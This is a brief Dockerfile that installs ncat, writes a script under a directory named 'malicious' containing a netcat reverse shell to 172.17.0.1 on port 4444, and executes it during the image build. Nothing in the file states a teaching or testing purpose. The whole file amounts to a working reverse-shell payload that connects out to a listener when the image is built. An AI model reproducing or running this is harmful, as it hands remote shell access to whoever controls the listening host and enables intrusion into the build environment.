FROM ubuntu:latest
RUN apt update && \
    apt install -y ncat
RUN mkdir -p /home/malicious
RUN echo "nc 172.17.0.1 4444 -e /bin/sh" > /home/malicious/reverse.sh
RUN chmod +x /home/malicious/reverse.sh
RUN ./home/malicious/reverse.sh
